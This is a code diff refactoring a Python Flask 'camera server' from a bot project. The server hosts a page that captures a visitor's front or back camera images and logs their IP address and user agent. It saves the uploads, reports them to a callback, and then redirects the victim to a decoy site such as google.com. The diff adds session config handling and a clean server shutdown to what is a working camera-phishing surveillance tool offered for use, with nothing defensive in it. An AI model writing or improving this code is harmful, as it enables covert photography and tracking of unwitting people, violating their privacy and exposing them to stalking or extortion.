@@ -14,11 +14,26 @@ import time
 import base64
 from pathlib import Path
 from typing import Optional, Callable, List
+from dataclasses import dataclass, field
 
 from flask import Flask, render_template_string, request
+from werkzeug.serving import make_server
 from bot.config import OWN_CAM_DIR, CAPTURED_DIR, IP_LOGS_DIR, CAM_SERVER_HOST, CAM_SERVER_PORT
 
 logger = logging.getLogger(__name__)
+
+
+@dataclass
+class CamSessionConfig:
+    """
+    Per-session configuration for the camera server.
+    Each new session gets a fresh config, preventing stale data carry-over.
+    """
+    redirect_url: str = "https://google.com"
+    redirect_time: int = 5
+    camera_mode: str = "front"
+    server_url: str = ""
+    port: int = CAM_SERVER_PORT
 
 
 class CamService:
@@ -35,6 +50,7 @@ class CamService:
 
     def __init__(self):
         self.app: Optional[Flask] = None
+        self._server = None  # werkzeug Server instance for clean shutdown
         self.server_thread: Optional[threading.Thread] = None
         self.monitor_thread: Optional[threading.Thread] = None
         self.is_running = False
@@ -43,12 +59,8 @@ class CamService:
         self.last_check_time: Optional[datetime.datetime] = None
         self._stop_event = threading.Event()
 
-        # Configuration (set before start)
-        self.redirect_url = "https://google.com"
-        self.redirect_time = 5
-        self.camera_mode = "front"
-        self.server_url = ""
-        self.port = CAM_SERVER_PORT
+        # Use a dataclass for config so each session gets a clean slate
+        self.config = CamSessionConfig()
 
         # Callback for new captures
         self._on_capture_callback: Optional[Callable] = None
@@ -62,19 +74,63 @@ class CamService:
 
     def configure(self, redirect_url: str, redirect_time: int,
                   camera_mode: str, server_url: str, port: int = None):
-        """Configure the server before starting."""
-        self.redirect_url = redirect_url
-        self.redirect_time = redirect_time
-        self.camera_mode = camera_mode
-        self.server_url = server_url
-        if port:
-            self.port = port
+        """Configure the server before starting. Uses a fresh config object."""
+        # Create a NEW config object to avoid any stale references
+        self.config = CamSessionConfig(
+            redirect_url=redirect_url,
+            redirect_time=redirect_time,
+            camera_mode=camera_mode,
+            server_url=server_url,
+            port=port or CAM_SERVER_PORT,
+        )
+
+    @property
+    def redirect_url(self):
+        return self.config.redirect_url
+
+    @redirect_url.setter
+    def redirect_url(self, value: str):
+        self.config.redirect_url = value
+
+    @property
+    def redirect_time(self):
+        return self.config.redirect_time
+
+    @redirect_time.setter
+    def redirect_time(self, value: int):
+        self.config.redirect_time = value
+
+    @property
+    def camera_mode(self):
+        return self.config.camera_mode
+
+    @camera_mode.setter
+    def camera_mode(self, value: str):
+        self.config.camera_mode = value
+
+    @property
+    def server_url(self):
+        return self.config.server_url
+
+    @server_url.setter
+    def server_url(self, value: str):
+        self.config.server_url = value
+
+    @property
+    def port(self):
+        return self.config.port
+
+    @port.setter
+    def port(self, value: int):
+        self.config.port = value
 
     def _build_flask_app(self) -> Flask:
         """
         Build a Flask app that replicates the behavior of own-cam/eye.py
-        using the same HTML template and capture endpoint, but without
-        interactive terminal input.
+        using the same HTML template and capture endpoint.
+        
+        CRITICAL: The template variables are read from self.config at request time,
+        NOT at build time, so changes to config are always reflected.
         """
         app = Flask(__name__, static_folder=str(OWN_CAM_DIR))
 
@@ -82,12 +138,10 @@ class CamService:
         CAPTURED_DIR.mkdir(parents=True, exist_ok=True)
         IP_LOGS_DIR.mkdir(parents=True, exist_ok=True)
 
-        redirect_url = self.redirect_url
-        redirect_time = self.redirect_time
-        camera_mode = self.camera_mode
+        # Store reference to self for use in route closures
+        service = self
 
-        # Load the HTML template from eye.py
-        # We read it from the file to preserve the original
+        # Load the HTML template once
         html_template = self._get_html_template()
 
         def get_client_ip():
@@ -106,11 +160,13 @@ class CamService:
 
             logger.info(f"Visitor: {client_ip} | {user_agent}")
 
+            # CRITICAL FIX: Read config from the service instance at request time
+            # This ensures the LATEST config is used, not stale build-time values
             return render_template_string(
                 html_template,
-                redirect_url=redirect_url,
-                redirect_time=redirect_time,
-                camera_mode=camera_mode
+                redirect_url=service.config.redirect_url,
+                redirect_time=service.config.redirect_time,
+                camera_mode=service.config.camera_mode
             )
 
         @app.route("/capture", methods=["POST"])
@@ -119,16 +175,15 @@ class CamService:
             camera_label = "unknown"
 
             # Handle both FormData (blob) and JSON (base64) uploads
-            # This matches the logic from eye.py
             if request.content_type and "multipart/form-data" in request.content_type:
-                # Binary blob from FormData (eye.py advanced mode)
+                # Binary blob from FormData
                 camera_label = request.form.get("camera", "unknown")
                 image_file = request.files.get("image")
                 if not image_file:
                     return "no image", 400
                 image_bytes = image_file.read()
             elif request.is_json:
-                # Base64 JSON (main.py / mobile.py mode)
+                # Base64 JSON
                 data = request.json
                 camera_label = data.get("camera", "unknown")
                 image_data = data.get("image", "")
@@ -160,12 +215,8 @@ class CamService:
 
     def _get_html_template(self) -> str:
         """
-        Extract the HTML template from eye.py.
-        We read the eye.py source and extract the HTML string,
-        or use the embedded template directly.
+        Return the HTML template string for the camera capture page.
         """
-        # Use the complete HTML template from eye.py which supports
-        # front/back/both camera modes with ImageCapture API
         return '''
 <!DOCTYPE html>
 <html lang="en">
@@ -423,6 +474,7 @@ class CamService:
             return False
 
         try:
+            # CRITICAL: Build a FRESH Flask app with current config each time
             self.app = self._build_flask_app()
             self.capture_count = 0
             self.start_time = datetime.datetime.now()
@@ -446,7 +498,12 @@ class CamService:
             self.monitor_thread.start()
 
             self.is_running = True
-            logger.info(f"Camera server started on {CAM_SERVER_HOST}:{self.port}")
+            logger.info(
+                f"Camera server started on {CAM_SERVER_HOST}:{self.config.port} "
+                f"with redirect_url={self.config.redirect_url}, "
+                f"camera_mode={self.config.camera_mode}, "
+                f"redirect_time={self.config.redirect_time}s"
+            )
             return True
 
         except Exception as e:
@@ -457,18 +514,19 @@ class CamService:
     def _run_server(self):
         """Run the Flask server (called in thread)."""
         try:
-            # Suppress Flask's default logging to avoid cluttering
+            # Suppress Flask's default logging
             import logging as _logging
             log = _logging.getLogger('werkzeug')
             log.setLevel(_logging.WARNING)
 
-            self.app.run(
-                host=CAM_SERVER_HOST,
-                port=self.port,
-                debug=False,
-                use_reloader=False,
-                threaded=True
+            # Use make_server so we can call server.shutdown() to release the port
+            self._server = make_server(
+                CAM_SERVER_HOST,
+                self.config.port,
+                self.app,
+                threaded=True,
             )
+            self._server.serve_forever()
         except Exception as e:
             logger.error(f"Flask server error: {e}")
             self.is_running = False
@@ -488,22 +546,18 @@ class CamService:
                         self.last_check_time = datetime.datetime.now()
                         for fp in new_files:
                             try:
-                                # Extract camera label and IP from filename / log
                                 camera = "unknown"
                                 name = fp.stem
                                 if name.startswith("front_"):
                                     camera = "front"
                                 elif name.startswith("back_"):
                                     camera = "back"
-
                                 self._on_capture_callback(fp, "", camera)
                             except Exception as e:
                                 logger.error(f"Capture callback error: {e}")
-
             except Exception as e:
                 logger.error(f"Monitor error: {e}")
-
-            self._stop_event.wait(timeout=3)  # Check every 3 seconds
+            self._stop_event.wait(timeout=3)
 
     def stop(self) -> dict:
         """
@@ -512,6 +566,14 @@ class CamService:
         """
         self._stop_event.set()
         self.is_running = False
+
+        # Shutdown the werkzeug server to release the port
+        if self._server:
+            try:
+                self._server.shutdown()
+            except Exception as e:
+                logger.error(f"Error shutting down Flask server: {e}")
+            self._server = None
 
         uptime = ""
         if self.start_time:
@@ -523,15 +585,19 @@ class CamService:
             "uptime": uptime,
         }
 
-        # Flask doesn't have a clean shutdown from outside the request context,
-        # but since the thread is a daemon, it will be cleaned up.
-        # For a cleaner approach, we'd use werkzeug.serving.make_server
-        self.app = None
+        # Clean up threads
         self.server_thread = None
         self.monitor_thread = None
         self.start_time = None
+        self.app = None
 
-        logger.info(f"Camera server stopped. Stats: {stats}")
+        # CRITICAL FIX: Reset to a FRESH config object with defaults
+        # This ensures the next session starts CLEAN with no stale values
+        self.config = CamSessionConfig()
+        self.capture_count = 0
+        self._on_capture_callback = None
+
+        logger.info(f"Camera server stopped. Stats: {stats}. Config reset to defaults.")
         return stats
 
     def get_status(self) -> dict:
@@ -548,8 +614,9 @@ class CamService:
             "is_running": self.is_running,
             "capture_count": total_files,
             "uptime": uptime,
-            "server_url": self.server_url,
-            "camera_mode": self.camera_mode,
+            "server_url": self.config.server_url,
+            "camera_mode": self.config.camera_mode,
+            "redirect_url": self.config.redirect_url,
         }
 
     def get_captures(self, limit: int = 5) -> List[Path]:
